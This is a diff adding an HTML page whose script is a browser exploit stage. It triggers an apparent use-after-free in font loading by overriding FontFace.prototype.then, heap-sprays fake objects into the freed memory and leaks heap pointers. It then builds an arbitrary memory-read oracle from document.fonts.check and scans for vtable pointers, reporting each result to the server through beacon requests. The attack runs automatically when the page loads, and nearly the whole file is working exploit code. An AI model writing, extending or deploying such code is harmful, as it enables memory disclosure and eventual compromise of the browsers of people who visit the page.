@@ -1,0 +1,215 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T7d</title></head>
+<body><pre id="O">T7d</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T7d-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=1024,PF=500,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+window.__pf=[];for(var pfi=0;pfi<PF;pfi++)window.__pf.push(new Uint8Array(new ArrayBuffer(SZ)));
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+      w[0x82]=3;
+      w[0x38]=0x00;w[0x39]=0x10;w[0x3A]=0x00;w[0x3B]=0x00;
+      w[0x3C]=0x00;w[0x3D]=0x20;w[0x3E]=0x00;w[0x3F]=0x00;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,100);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+  var h0=bufs[0][0];
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+    put64(vb,0x20,0n);put32(vb,0x28,0);put32(vb,0x2C,0);
+  }
+  setTimeout(function(){
+    bs('FACES='+faces.length);
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      setTimeout(function(){
+        var zi=-1;
+        for(var q=0;q<faces.length;q++){
+          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+          if(r===false){zi=q;break;}
+        }
+        bs('ZI='+zi);
+        if(zi<0){bs('NOORACLE');return;}
+
+        function setR(addr){for(var ir=0;ir<bufs.length;ir++)put64(bufs[ir][0],0x20,addr);}
+        function chk(c){try{return document.fonts.check('1em zz'+zi,String.fromCodePoint(c))===false;}catch(e){return null;}}
+
+        for(var ip=0;ip<bufs.length;ip++){
+          bufs[ip][0][0x82]=0;
+          put32(bufs[ip][0],0x38,0x1000);put32(bufs[ip][0],0x3C,0x2000);
+          put64(bufs[ip][0],0x20,L2);
+          bufs[ip][0][0x28]=1;bufs[ip][0][0x2C]=1;
+        }
+
+        bs('SCAN1');
+        var self=0n,n3=0;
+        var anchors=[(L1&~0xFFn),(L2&~0xFFn)];
+        for(var an=0;an<anchors.length&&!self;an++){
+          var cS=anchors[an]-0x400000n,cE=anchors[an]+0x400000n;
+          if(cS<0x10000n)cS=0x10000n;
+          for(var a=cS;a<cE&&!self;a+=128n){
+            setR(a+0x38n);n3++;
+            if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+              self=a;bs('SELF='+hex(a));
+            }
+          }
+        }
+        bs('SCAN1-END-n='+n3);
+        if(!self){bs('NOSELF');}
+
+        function bsFrom(lo,hi){
+          if(chk(hi)!==true)return -1;
+          while(lo<hi){var mid=(lo+hi)>>>1;if(chk(mid)===true)hi=mid;else lo=mid+1;}
+          return lo;
+        }
+        function bsTo(fr,hi){
+          var lo=fr;
+          while(lo<hi){var mid=(lo+hi+1)>>>1;if(chk(mid)===true)lo=mid;else hi=mid-1;}
+          return lo;
+        }
+
+        // read2: read s2 (bytes 2-5) and s3 (bytes 3-6) at an address
+        function read2(label,addr){
+          setR(addr+2n);
+          var f2=bsFrom(0,0x10FFFF);
+          var t2=-1;if(f2>=0)t2=bsTo(f2,0x10FFFF);
+          setR(addr+3n);
+          var f3=bsFrom(0,0x10FFFF);
+          var t3=-1;if(f3>=0)t3=bsTo(f3,0x10FFFF);
+          var tag=label+'-s2f='+(f2>=0?'0x'+f2.toString(16):'-1');
+          tag+='-s2t='+(t2>=0?'0x'+t2.toString(16):'-1');
+          tag+='-s3f='+(f3>=0?'0x'+f3.toString(16):'-1');
+          tag+='-s3t='+(t3>=0?'0x'+t3.toString(16):'-1');
+          bs(tag);
+          return {f2:f2,t2:t2,f3:f3,t3:t3};
+        }
+
+        // ============================================================
+        // PHASE A: Wide scan around L1 object
+        // T7c proved *L1 = L2. Now read L1 at multiple offsets to
+        // find WPI via the P693 path (L1-0x10) and map L1's object.
+        // ============================================================
+        bs('PH-A');
+
+        // P693 entry: L1-0x10
+        read2('L1m10',L1-0x10n);
+
+        // L1-0x08: adjacent field before L1
+        read2('L1m08',L1-0x08n);
+
+        // L1+0x00: we know *L1=L2, read for confirmation/full bytes
+        read2('L1p00',L1);
+
+        // L1+0x08: second qword in L1's object
+        read2('L1p08',L1+0x08n);
+
+        // L1+0x10, +0x18, +0x20: further fields
+        read2('L1p10',L1+0x10n);
+        read2('L1p18',L1+0x18n);
+        read2('L1p20',L1+0x20n);
+
+        // ============================================================
+        // PHASE B: Scan L2 at wider offsets
+        // L2+0 and L2+8 were dead in T7c. Try further offsets.
+        // ============================================================
+        bs('PH-B');
+
+        read2('L2m10',L2-0x10n);
+        read2('L2m08',L2-0x08n);
+        read2('L2p00',L2);
+        read2('L2p08',L2+0x08n);
+        read2('L2p10',L2+0x10n);
+        read2('L2p18',L2+0x18n);
+        read2('L2p20',L2+0x20n);
+
+        // ============================================================
+        // PHASE C: If any read shows a text-segment pointer pattern
+        // (s2f in 0x80000..0x8FFFF), report it as a vtable candidate
+        // ============================================================
+        bs('PH-C-VTCHECK');
+
+        // Re-read L1-0x10 at s2 for vtable check
+        setR(L1-0x10n+2n);
+        var vtF=bsFrom(0,0x10FFFF);
+        if(vtF>=0x80000&&vtF<=0x8FFFF){
+          bs('VTCAND-L1m10-s2f=0x'+vtF.toString(16));
+          setR(L1-0x10n+3n);
+          var vtF3=bsFrom(0,0x10FFFF);
+          bs('VTCAND-L1m10-s3f='+(vtF3>=0?'0x'+vtF3.toString(16):'-1'));
+        }
+
+        // Check L1-0x08 for vtable
+        setR(L1-0x08n+2n);
+        vtF=bsFrom(0,0x10FFFF);
+        if(vtF>=0x80000&&vtF<=0x8FFFF){
+          bs('VTCAND-L1m08-s2f=0x'+vtF.toString(16));
+        }
+
+        // Check L2-0x10 and L2-0x08
+        setR(L2-0x10n+2n);
+        vtF=bsFrom(0,0x10FFFF);
+        if(vtF>=0x80000&&vtF<=0x8FFFF){
+          bs('VTCAND-L2m10-s2f=0x'+vtF.toString(16));
+        }
+
+        setR(L2-0x08n+2n);
+        vtF=bsFrom(0,0x10FFFF);
+        if(vtF>=0x80000&&vtF<=0x8FFFF){
+          bs('VTCAND-L2m08-s2f=0x'+vtF.toString(16));
+        }
+
+        // Restore oracle
+        put32(h0,0x38,0x1000);put32(h0,0x3C,0x2000);
+        if(self)setR(self+0x38n);
+
+        bs('DONE');
+        document.getElementById('O').textContent='T7d DONE';
+      },50);
+    },50);
+  },50);
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
